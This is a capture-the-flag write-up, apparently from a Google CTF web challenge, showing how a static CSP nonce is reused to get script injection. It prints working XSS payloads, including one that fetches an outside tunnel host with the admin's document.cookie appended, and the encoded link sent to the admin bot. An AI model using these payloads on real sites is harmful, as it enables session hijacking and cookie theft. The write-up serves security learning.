# falling slowly... again - google ctf - web

This site boasts a defense against XSS, but its security is like a falling leaf – slow and predictable. It relies on a mechanism that, while sound in theory, has a fatal flaw in its execution. Can you exploit this weakness to inject your own malicious code and take control?


When testing for an XSS with the usual 

```
<script>alert()</script>
```

XSS payload, I see that it is loaded into the page but the script doesn't function. Opening up devtools gives us the following CSP error:

![csp](https://github.com/user-attachments/assets/da97b2b2-8106-45d4-9d5b-8a0908cabf5a)

Nonce is like a key that must be presented in order for script to be run inline.

To bypass this, we just have to include the nonce value in the payload:

```
<script nonce=bO4ppxGUAjltHc4UXpjG6ggg>alert()</script>
```

Success:

![alert](https://github.com/user-attachments/assets/afea90bc-e4cf-4225-80da-28c264ea8be0)


From here, the cookies for the admin seem like the logical place for the flag so I create a new payload that will fetch a domain under my control with the cookie included as part of the request. The payload to first add into the "name" parameter:

```
<script nonce=bO4ppxGUAjltHc4UXpjG6ggg>fetch('https://performer-disagree-nor-agency.trycloudflare.com/'+document.cookie)</script>
```

Next we send the XSS url to the admin:

```
https://once-web.2024-bq.ctfcompetition.com/?name=%3Cscript+nonce%3DbO4ppxGUAjltHc4UXpjG6ggg%3Efetch%28%27https%3A%2F%2Fperformer-disagree-nor-agency.trycloudflare.com%2F%27%2Bdocument.cookie%29%3C%2Fscript%3E
```

And the result from a python listener:

![flag](https://github.com/user-attachments/assets/d184eed2-a939-4290-9657-497b3da4676b)


# Resources/Learning

- CSP - nonce
